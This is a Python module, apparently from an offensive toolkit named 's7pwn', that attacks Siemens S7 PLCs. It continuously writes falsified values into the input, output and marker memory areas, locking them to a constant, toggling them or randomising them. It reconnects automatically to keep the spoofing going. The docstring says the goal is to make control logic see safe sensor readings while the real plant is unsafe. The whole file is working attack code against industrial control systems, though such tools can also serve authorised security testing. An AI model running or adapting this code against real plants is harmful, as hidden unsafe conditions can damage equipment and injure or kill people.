from __future__ import annotations
"""
spoof.py – Signal / Sensor Spoofing Attack
-------------------------------------------
Continuously inject falsified sensor values into the PLC's Input (I),
Output (Q), or Marker (M) area to deceive the control program or the
SCADA/HMI layer into believing a physical condition that does not exist.

Three spoofing modes
--------------------
  constant   – lock every target address to a fixed value (default)
  zigzag     – oscillate between min and max at a configurable period
  random     – write uniformly-random bytes every cycle

Usage
-----
  spoof <addr>=<val>:<type> [...] [--mode constant|zigzag|random]
         [--interval 0.5] [--min 0] [--max 255]

Examples
--------
  # Fake temperature sensor always reads 25.0°C (Real in M area):
  spoof M10=25.0:real --mode constant

  # Fake a boolean pressure switch rapidly toggling:
  spoof I3.2=1:bool --mode zigzag --interval 0.2

  # Randomise output coil bytes to confuse actuator logic:
  spoof Q0=0:byte Q1=0:byte --mode random --interval 0.1

Attack scenario
---------------
The attacker writes fabricated values into the *Input* area (I) that
the PLC ladder-logic normally reads from physical I/O modules.
By keeping those values locked (or oscillating), the PLC program
"sees" a sensor state different from reality – e.g. always-safe
pressure, always-open door, always-nominal temperature – while
the real plant may be in an unsafe condition.
"""

import time
import random
import struct
from typing import List, Optional, Tuple

from snap7.util import get_bool, set_bool
from s7pwn.runtime import get_current_target
from s7pwn.utils import s7_connect
from s7pwn.core_io import AREA_MAP, TYPE_MAP, coerce_value, INTERVAL_DEFAULT, EPSILON_REAL

# ──────────────────────────────────────────────
#  Helpers
# ──────────────────────────────────────────────

def _parse_items(tokens: List[str]):
    items = []
    for tok in tokens:
        if tok.startswith("--"):
            break
        if "=" not in tok or ":" not in tok:
            print(f"[!] Invalid format '{tok}'. Expected addr=value:type"); return None
        addr_val, typ = tok.split(":", 1)
        address, value_str = addr_val.split("=", 1)
        area = address[0].upper()
        idx  = address[1:]
        if area not in AREA_MAP:
            print(f"[!] Unsupported area: {area}"); return None
        if typ not in TYPE_MAP:
            print(f"[!] Unsupported type: {typ}"); return None
        is_bit = TYPE_MAP[typ]["is_bit"]
        if is_bit and "." not in idx:
            print(f"[!] Bool requires byte.bit format, e.g. I3.2"); return None
        if not is_bit and "." in idx:
            print(f"[!] Non-bool requires byte format, e.g. M10"); return None
        items.append({"area": area, "index": idx, "type": typ, "value_str": value_str})
    return items


def _write_value(client, it: dict, override_value=None) -> bool:
    """Write a single value. Returns True on success."""
    area_enum = AREA_MAP[it["area"]]
    tinfo     = TYPE_MAP[it["type"]]
    try:
        target_val = override_value if override_value is not None else coerce_value(it["type"], it["value_str"])
        if tinfo["is_bit"]:
            byte_index, bit_index = map(int, it["index"].split("."))
            data = bytearray(client.read_area(area_enum, 0, byte_index, 1))
            set_bool(data, 0, bit_index, bool(target_val))
            client.write_area(area_enum, 0, byte_index, data)
        else:
            byte_index = int(it["index"])
            buf = bytearray(tinfo["size"])
            tinfo["set"](buf, 0, target_val)
            client.write_area(area_enum, 0, byte_index, buf)
        return True
    except Exception as e:
        print(f"  [!] Write {it['area']}{it['index']}:{it['type']} failed: {e}")
        return False


# ──────────────────────────────────────────────
#  Reconnect helper
# ──────────────────────────────────────────────

MAX_FAIL_STREAK  = 5    # Số lần ghi thất bại liên tiếp trước khi reconnect
RECONNECT_DELAY  = 5.0  # Giây chờ trước khi thử kết nối lại

def _ensure_connected(client, target: dict) -> object:
    """Kiểm tra kết nối và reconnect nếu cần. Trả về client đang dùng."""
    try:
        if client.get_connected():
            return client
    except Exception:
        pass
    print(f"  [~] Kết nối mất — thử reconnect tới {target['ip']} sau {RECONNECT_DELAY}s...")
    while True:
        try:
            client.disconnect()
        except Exception:
            pass
        time.sleep(RECONNECT_DELAY)
        try:
            client.connect(target["ip"], target["rack"], target["slot"])
            if client.get_connected():
                print("  [✓] Reconnect thành công!")
                return client
        except Exception as e:
            print(f"  [!] Reconnect thất bại: {e} — thử lại...")


# ──────────────────────────────────────────────
#  Mode implementations
# ──────────────────────────────────────────────

def _constant_mode(client, norm: List[dict], interval: float, target: dict) -> None:
    print("[*] Mode: CONSTANT (Ctrl+C to stop)")
    for it in norm:
        print(f"  Lock {it['area']}{it['index']}={it['value_str']}:{it['type']}")
    print()
    fail_streak = 0
    try:
        while True:
            client = _ensure_connected(client, target)
            all_ok = True
            for it in norm:
                if not _write_value(client, it):
                    all_ok = False
            if all_ok:
                fail_streak = 0
            else:
                fail_streak += 1
                if fail_streak >= MAX_FAIL_STREAK:
                    print(f"  [!] {fail_streak} lần thất bại liên tiếp — buộc reconnect...")
                    try: client.disconnect()
                    except Exception: pass
                    fail_streak = 0
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Spoof stopped.")


def _zigzag_mode(client, norm: List[dict], interval: float,
                 val_min: float, val_max: float, target: dict) -> None:
    print(f"[*] Mode: ZIGZAG  min={val_min} max={val_max}  interval={interval}s (Ctrl+C to stop)")
    state      = False   # False=min side, True=max side
    cycle      = 0
    fail_streak = 0
    try:
        while True:
            client = _ensure_connected(client, target)
            cycle += 1
            state  = not state
            cycle_ok = True
            for it in norm:
                tinfo = TYPE_MAP[it["type"]]
                if tinfo["is_bit"]:
                    ok  = _write_value(client, it, bool(state))
                    tag = "1" if state else "0"
                else:
                    v = val_max if state else val_min
                    if it["type"] in ("int", "dint", "uint", "byte", "lint"):
                        v = int(v)
                    ok  = _write_value(client, it, v)
                    tag = str(v)
                if ok:
                    print(f"  [ZIGZAG c={cycle}] {it['area']}{it['index']} -> {tag}")
                else:
                    cycle_ok = False
            if cycle_ok:
                fail_streak = 0
            else:
                fail_streak += 1
                if fail_streak >= MAX_FAIL_STREAK:
                    print(f"  [!] {fail_streak} lần thất bại liên tiếp — buộc reconnect...")
                    try: client.disconnect()
                    except Exception: pass
                    fail_streak = 0
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Spoof stopped.")


def _random_mode(client, norm: List[dict], interval: float, target: dict) -> None:
    print("[*] Mode: RANDOM (Ctrl+C to stop)")
    cycle       = 0
    fail_streak = 0
    try:
        while True:
            client = _ensure_connected(client, target)
            cycle += 1
            cycle_ok = True
            for it in norm:
                tinfo = TYPE_MAP[it["type"]]
                if tinfo["is_bit"]:
                    rv = random.choice([True, False])
                elif it["type"] in ("real", "lreal"):
                    rv = random.uniform(0.0, 100.0)
                elif it["type"] == "byte":
                    rv = random.randint(0, 255)
                elif it["type"] == "uint":
                    rv = random.randint(0, 65535)
                elif it["type"] in ("int",):
                    rv = random.randint(-32768, 32767)
                elif it["type"] in ("dint",):
                    rv = random.randint(-2**31, 2**31 - 1)
                else:
                    rv = random.randint(0, 255)
                ok = _write_value(client, it, rv)
                if ok:
                    print(f"  [RAND c={cycle}] {it['area']}{it['index']}:{it['type']} -> {rv}")
                else:
                    cycle_ok = False
            if cycle_ok:
                fail_streak = 0
            else:
                fail_streak += 1
                if fail_streak >= MAX_FAIL_STREAK:
                    print(f"  [!] {fail_streak} lần thất bại liên tiếp — buộc reconnect...")
                    try: client.disconnect()
                    except Exception: pass
                    fail_streak = 0
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Spoof stopped.")


# ──────────────────────────────────────────────
#  Entry point
# ──────────────────────────────────────────────

def spoof(args: List[str]) -> None:
    if not args:
        print("Usage: spoof <addr>=<val>:<type> [...] [--mode constant|zigzag|random]")
        print("             [--interval 0.5] [--min 0] [--max 255]")
        return

    mode     = "constant"
    interval = INTERVAL_DEFAULT
    val_min  = 0.0
    val_max  = 255.0
    items_raw: List[str] = []

    i = 0
    while i < len(args):
        if args[i] == "--mode" and i + 1 < len(args):
            mode = args[i + 1].lower(); i += 2
        elif args[i] == "--interval" and i + 1 < len(args):
            interval = float(args[i + 1]); i += 2
        elif args[i] == "--min" and i + 1 < len(args):
            val_min = float(args[i + 1]); i += 2
        elif args[i] == "--max" and i + 1 < len(args):
            val_max = float(args[i + 1]); i += 2
        else:
            if not args[i].startswith("--"):
                items_raw.append(args[i])
            i += 1

    if not items_raw:
        print("[!] No addresses specified."); return

    norm = _parse_items(items_raw)
    if norm is None: return

    t = get_current_target()
    if not t:
        print("[!] No target selected. Use 'set_target' or 'select'."); return

    c = s7_connect(t["ip"], t["rack"], t["slot"])
    if not c:
        print("[!] Connection failed."); return

    print(f"[*] Signal Spoofing -> {t['ip']}  mode={mode}  interval={interval}s")

    try:
        if mode == "constant":
            _constant_mode(c, norm, interval, t)
        elif mode == "zigzag":
            _zigzag_mode(c, norm, interval, val_min, val_max, t)
        elif mode == "random":
            _random_mode(c, norm, interval, t)
        else:
            print(f"[!] Unknown mode '{mode}'. Valid: constant | zigzag | random")
    finally:
        try: c.disconnect()
        except Exception: pass
